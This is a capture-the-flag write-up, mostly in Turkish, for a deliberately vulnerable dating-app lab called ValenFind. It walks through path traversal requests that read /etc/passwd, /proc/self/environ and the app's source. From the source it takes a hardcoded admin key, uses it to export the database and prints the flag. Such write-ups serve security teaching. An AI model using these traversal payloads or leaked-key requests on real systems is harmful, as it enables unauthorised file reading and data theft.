<h1>💘Love at First Breach 2026 – ValenFind Writeup</h1>

<h1>Objective</h1>
My Dearest Hacker,  
There’s this new dating app called “Valenfind” that just popped up out of nowhere. I hear the creator only learned to code this year; surely this must be vibe-coded. Can you exploit it?

<h1>Machine Initialization</h1>
İlk önce makineler açılır
<br><br>
<img width="1059" height="432" alt="image" src="https://github.com/user-attachments/assets/ef3699da-3b4c-43cd-b0b5-1086509a822c" />
<br><br>

<h1>Application Analysis</h1>
Uygulama incelenirken arayüzde bulunan “Profile Theme” açılır menüsü test edildi. Tema seçenekleri değiştirilirken arka planda bir API isteğinin gönderildiği fark edildi.  
Burp Suite üzerinden trafik incelendiğinde şu endpoint’in çağrıldığı görüldü:
<br><br>
<img width="1403" height="722" alt="image" src="https://github.com/user-attachments/assets/f5a3bc85-a8c0-4893-a2bf-07762c9fccda" />
<br><br>

<h1>Reconnaissance – Capturing the Vulnerable Request</h1>
Keşif aşamasında, Burp Suite kullanılarak `/api/fetch_layout` endpoint’ine gönderilen GET isteği yakalandı (intercept edildi).  

Burada şu endpoint keşfedildi:  
`/api/fetch_layout?layout=`

İstek detayları incelendiğinde özellikle **layout** parametresi izole edilerek analiz edildi. Bu parametrenin kullanıcı tarafından kontrol edilebildiği ve doğrudan backend tarafında işlendiği görüldü.
<img width="1598" height="849" alt="image" src="https://github.com/user-attachments/assets/57a71759-9826-43c5-a58e-59858e943c14" />


<br><br>
<h1>Path Traversal Test</h1>

<h2>Request</h2>
<pre>
GET /api/fetch_layout?layout=../../../../etc/passwd HTTP/1.1
</pre>
Layout parametresi üzerinden path traversal testi yapıldı.<br>
Bu tek istek ile aşağıdakileri kanıtlamış olduk:<br><br>

1️⃣ Sunucunun dosya sistemine erişebildiğimizi<br>
2️⃣ Input validation olmadığını (Kullanıcının gönderdiği veri filtrelenmeden kabul edildiğini)<br>
3️⃣ LFI + Path Traversal zafiyetinin mevcut olduğunu<br>

Bu tarz input validation eksiklikleri aşağıdaki zafiyetlere yol açabilir:<br>

- Path Traversal<br>
- Local File Inclusion (LFI)<br>
- SQL Injection<br>
- Command Injection
  
<h2>Response</h2>
<img width="1600" height="848" alt="image" src="https://github.com/user-attachments/assets/725375cf-a772-4e1a-be38-095cc867f15b" />
<br><br>

<h1>Proc Enumeration</h1>
<h2>Request (environ)</h2>
Environment değişkenlerini görüntülemek ve olası secret / token bilgilerini tespit etmek amacıyla gönderildi.
<pre>
GET /api/fetch_layout?layout=../../../../proc/self/environ HTTP/1.1
</pre>

<h2>Response</h2>
Response içerisinde sistem ortam değişkenlerine ait bilgiler görüntülendi.  
Çıktıda `/root`, `/home`, `root`, `shell` gibi sistem path ve kullanıcı referansları tespit edildi.  
<br><br>
<img width="1600" height="851" alt="image" src="https://github.com/user-attachments/assets/a74d57e3-9573-4af9-9b4c-9a7d781647a2" />
<br><br>

<h2>Request (cmdline)</h2>
Çalışan uygulamanın hangi komut ile başlatıldığını ve gerçek dosya yolunu öğrenmek amacıyla gönderildi.
<pre>
GET /api/fetch_layout?layout=../../../../proc/self/cmdline HTTP/1.1
</pre>

<h2>Response</h2>
Response içerisinde uygulamanın hangi komut ile çalıştırıldığı görüldü.  
Python interpreter üzerinden `/opt/Valenfind/app.py` dosyasının çalıştırıldığı tespit edildi.  
Bu bilgi, kaynak kodun tam konumunu belirlemek için kritik öneme sahiptir.
<br>
<pre>
/usr/bin/python3 /opt/Valenfind/app.py
</pre>
<img width="1595" height="856" alt="image" src="https://github.com/user-attachments/assets/6de20d26-e5cd-4ff3-89ce-c54b311040b2" />
<br><br>


<h1>Source Code Extraction</h1>
<h2>Request</h2>
<pre>
GET /api/fetch_layout?layout=../../../../opt/Valenfind/app.py HTTP/1.1
</pre>
Bulunan path kullanılarak kaynak kod elde edildi.
<br><br>

<h2>Response</h2>
<img width="1598" height="850" alt="image" src="https://github.com/user-attachments/assets/72ecf0cb-87d3-49cd-aa23-bc19e03a1c39" />

Kod içerisinde kritik bilgi bulundu:

<pre>
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
</pre>

Ayrıca şu endpoint dikkat çekti:

<pre>
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')

    if auth_header == ADMIN_API_KEY:
        return send_file(DATABASE, ...)
</pre>

Token header üzerinden doğrulama yapıldığı görüldü.

<img width="1596" height="851" alt="image" src="https://github.com/user-attachments/assets/9a2d9e35-ab9d-4372-9b2d-7b9cc83be78e" />

<h1>Admin Endpoint Exploitation</h1>

<h2>Request</h2>
<pre>
GET /api/admin/export_db HTTP/1.1
Host: 10.80.186.67:5000
X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO
</pre>

Hardcoded API key kullanılarak admin endpoint’e erişim sağlandı.

<h2>Response</h2>
Database başarıyla export edildi.

<img width="1597" height="845" alt="image" src="https://github.com/user-attachments/assets/6b851077-e2e1-4c51-be9e-3baf26f55b8f" />

<h1>Flag</h1>
<pre>
HM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
</pre>
